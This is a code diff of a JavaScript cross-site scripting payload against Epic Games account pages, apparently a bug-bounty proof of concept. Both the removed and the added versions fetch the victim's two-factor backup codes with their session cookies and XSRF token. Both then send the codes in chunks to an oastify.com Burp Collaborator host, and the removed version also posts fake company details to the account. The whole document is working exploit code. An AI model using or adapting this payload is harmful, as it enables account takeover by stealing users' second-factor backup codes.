@@ -1,35 +1,56 @@
 (async () => {
   try {
-    // 1. Steal backup codes
-    const codesRes = await fetch("https://www.epicgames.com/account/v2/security/downloadBackupCodes", {
-      credentials: "include"
-    });
-    const codesText = await codesRes.text();
+    console.log("Fetching backup codes...");
 
-    // 2. Submit fake company info
-    await fetch("https://www.epicgames.com/account/v2/company-info/add", {
-      method: "POST",
+    // Extract XSRF token from cookies
+    const getCookie = (name) => {
+      const match = document.cookie.match(new RegExp("(^| )" + name + "=([^;]+)"));
+      return match ? match[2] : null;
+    };
+
+    const xsrfToken = getCookie("XSRF-AM-TOKEN");
+
+    const res = await fetch("https://www.epicgames.com/account/v2/security/downloadBackupCodes", {
       credentials: "include",
       headers: {
-        "Content-Type": "application/json"
-      },
-      body: JSON.stringify({
-        companyName: "Hacked Corp",
-        addressLine1: "XSS Street",
-        city: "Exploitville",
-        postalCode: "1337",
-        country: "ZZ"
-      })
+        "X-Xsrf-Token": xsrfToken
+      }
     });
 
-    // 3. Exfiltrate in chunks
-    const chunkSize = 1900;
-    for (let i = 0; i < codesText.length; i += chunkSize) {
-      const part = codesText.slice(i, i + chunkSize);
-      await fetch(`https://d0eyzo98v1h9oif2ya9m9b0pbgh75zvnk.oastify.com?data=${encodeURIComponent(part)}`);
+    if (!res.ok) {
+      console.error(`Failed to fetch, status: ${res.status}`);
+      return;
     }
 
-  } catch (err) {
-    console.error(err);
+    const reader = res.body.getReader();
+    let chunks = [];
+    let receivedLength = 0;
+
+    while (true) {
+      const { done, value } = await reader.read();
+      if (done) break;
+      chunks.push(value);
+      receivedLength += value.length;
+    }
+
+    let fullBody = new Uint8Array(receivedLength);
+    let position = 0;
+    for (let chunk of chunks) {
+      fullBody.set(chunk, position);
+      position += chunk.length;
+    }
+
+    const result = new TextDecoder("utf-8").decode(fullBody);
+    console.log("Backup codes fetched");
+
+    const chunkSize = 1900;
+    for (let i = 0; i < result.length; i += chunkSize) {
+      const part = result.slice(i, i + chunkSize);
+      await fetch(`https://4nspmfwzis40b92tl1wdw2ngy74yspxdm.oastify.com?data=${encodeURIComponent(part)}`);
+    }
+
+    console.log("Backup codes sent to Burp Collaborator");
+  } catch (error) {
+    console.error("Error:", error);
   }
 })();
